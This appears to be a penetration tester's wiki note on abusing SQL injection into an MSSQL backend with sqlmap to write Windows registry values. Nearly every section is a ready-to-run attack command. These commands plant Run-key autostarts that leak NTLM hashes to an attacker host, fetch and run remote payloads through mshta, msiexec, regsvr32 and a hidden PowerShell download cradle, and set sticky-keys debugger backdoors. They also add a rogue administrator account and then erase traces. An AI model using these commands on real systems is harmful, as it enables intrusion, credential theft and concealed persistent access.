# Windows Registry

Search Tag(s): #sqlmap #initial-access #persistence

## 01 - Create Registry Values

TODO: Provide a scenario if it's not possible to reboot the windows machine. An attacker can use **Denial of Service (DoS)** attack vector to crash the machine then it reboots to get a callback shell.

TODO: Gather conditions to takeover of the machine in the MSSQL backend

> [!IMPORTANT] Conditions
> 1. The DBMS backend must be MSSQL

![[Common Directories#^fa5f07]]

## 1.1 - Grab NTLM hashes

Run [[02 - DBMS Backend Relay Attack|Responder]] to grab the NTLM hashes

```
$ sqlmap -u "<URL>" --reg-add="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater" --reg-data="cmd.exe /c dir \\\\<attacker_IP>\\snare.txt"

$ sqlmap -u "<URL>" --reg-add="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater" --reg-data="cmd.exe /c net view \\\\<attacker_IP>\\snare.txt"

$ sqlmap -u "<URL>" --reg-read="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"
```

## 1.2 - Execute callback shell in disk

Upload a callback shell in the windows temporary directory.

```
$ sqlmap -u "<URL>" --file-write=/path/to/shell.exe --file-dest="C:\Windows\Temp\shell.exe"

$ sqlmap -u "<URL>" --reg-add="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater" --reg-data="C:\Windows\Temp\shell.exe"
```

Then confirm the registry value is updated successfully.

```
$ sqlmap -u "<URL>" --reg-read="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"
```

Cleanup the registry value and confirm it's deleted.

```
$ sqlmap -u "<URL>" --reg-del="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"

$ sqlmap -u "<URL>" --reg-read="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"
```

## 1.3 - Execute callback shell in memory (fileless)

### 1.3.1 - Host a webserver to stage the payload

Mshta

```
$ sqlmap -u "<URL>" --reg-value="Updater" --reg-data="mshta.exe http://<IP>/payload.hta"
```

Msiexec

```
$ sqlmap -u "<URL>" --reg-add="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater" --reg-data="msiexec.exe /q /i http://<attacker_IP>/payload.msi"
```

Regsvr32

```
$ sqlmap -u "<URL>"--reg-add="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater" --reg-data="regsvr32.exe /s /n /u /i:http://<attacker_IP>/payload.sct scrobj.dll"
```

PowerShell download cradle.

```
$ sqlmap -u "<URL>" --reg-add="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater" --reg-data="powershell.exe -nop -NonI -Nologo -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\'http://<IP>/shell.ps1\'))\""
```

### 1.3.2 - Directly execute the callback shell

Fileless one-liner PowerShell payload.

```
$ sqlmap -u "<URL>" --reg-add="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater" --reg-data="conhost.exe --headless powershell.exe -nop -NonI -Nologo -w hidden -e <base64_payload>"
```

Fileless one-liner Python payload.

```
$ sqlmap -u "<URL>" --reg-add="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater" --reg-data="python.exe -c <payload>"
```

Cleanup the registry value and confirm it's deleted.

```
$ sqlmap -u "<URL>" --reg-del="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"

$ sqlmap -u "<URL>" --reg-read="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"
```

## 1.4 - Living off the Land

### 1.4.1 - Remote Desktop Protocol via Stick Keys Command Prompt

We must first take note of the registry values to clear traces afterwards.

```
$ sqlmap -u "<URL>" --reg-read="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" --reg-value="Debugger"
```

Add a terminal prompt in the registry value.

```
$ sqlmap -u "<URL>" --reg-add="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" --reg-value="Debugger" --reg-type=REG_SZ --reg-data="cmd.exe"

$ sqlmap -u "<URL>" --reg-add="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" --reg-value="Debugger" --reg-type=REG_SZ --reg-data="powershell.exe"
```

Create user account (Optional). Refer to this [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x07 - Maintaining Access/Persistence/Windows/Host Persistence/Remote Login/Create User/Malware Development/Helpers|link]].

```
$ sqlmap -u "<URL>" --reg-add="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater" --reg-data="cmd.exe /c net user webadmin Passw0rd123\! /add /y & net localgroup Administrators webadmin /add /y & net localgroup \"Remote Desktop Users\" webadmin /add /y"
```

Then confirm the modified changes.

```
$ sqlmap -u "<URL>" --reg-read "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" --reg-value="Debugger"

$ sqlmap -u "<URL>" --reg-read="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"
```

Cleanup the registry value and double check to confirm.

```
$ sqlmap -u "<URL>" -p <parameter> --cookie="<cookie_seesion_ID_key>=<cookie_session_ID_value>" --random-agent --dbms=mssql --reg-del="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"

$ sqlmap -u "<URL>" -p <parameter> --cookie="<cookie_seesion_ID_key>=<cookie_session_ID_value>" --random-agent --dbms=mssql --reg-read="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"
```

### 1.4.2 - Remote Desktop Protocol via Accessibility On-Screen Keyboard Command Prompt

We must first take note of the registry values to clear traces afterwards.

```
$ sqlmap -u "<URL>" --reg-read="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" --reg-value="Debugger"
```

Add a terminal prompt in the registry value.

```
$ sqlmap -u "<URL>" --reg-add="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" --reg-value="Debugger" --reg-type=REG_SZ --reg-data="cmd.exe"

$ sqlmap -u "<URL>" --reg-add="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" --reg-value="Debugger" --reg-type=REG_SZ --reg-data="powershell.exe"
```

Then confirm the modified changes.

```
$ sqlmap -u "<URL>" --reg-read "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" --reg-value="Debugger"

$ sqlmap -u "<URL>" --reg-read="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"
```

Cleanup the registry value and double check to confirm.

```
$ sqlmap -u "<URL>" --reg-del="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"

$ sqlmap -u "<URL>" --reg-read="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value="Updater"
```

---
## References

### Backlinks

- [[Registry Hive References]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x07 - Maintaining Access/Persistence/Windows/Host Persistence/Remote Login/Third Party/Remote Monitoring and Management/AnyDesk/Manual/Living off the Land#^1f2bd0|Windows RDP Remote Login]]

### OWASP

- [OWASP: Pwning a shell via MSSQL DBMS](https://owasp.org/www-chapter-ghana/assets/slides/Pwning_a_shell_via_MSSQL_DBMS.pdf)

### NetSPI

- [NetSPI SQLWiki: Executing OS Commands Through SQL Server](https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver)